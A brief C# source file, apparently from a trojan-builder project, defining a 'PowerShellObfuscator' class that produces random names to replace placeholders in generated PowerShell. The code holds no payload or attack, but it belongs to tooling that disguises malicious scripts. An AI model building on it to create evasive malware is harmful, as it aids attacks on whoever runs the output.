using System.Text;

namespace TroyanBuilder;

/// <summary>Lightweight name / snippet randomization for generated PowerShell.</summary>
public sealed class PowerShellObfuscator
{
    private static readonly Random Shared = new();

    public static string GenerateRandomName()
    {
        const string chars = "abcdefghijklmnopqrstuvwxyz";
        var len = Shared.Next(10, 20);
        var sb = new StringBuilder(len);
        for (var i = 0; i < len; i++)
            sb.Append(chars[Shared.Next(chars.Length)]);
        return sb.ToString();
    }

    /// <summary>Placeholder segment for holder sources (replaces <c>###random</c>).</summary>
    public string RandomCode() => GenerateRandomName();
}
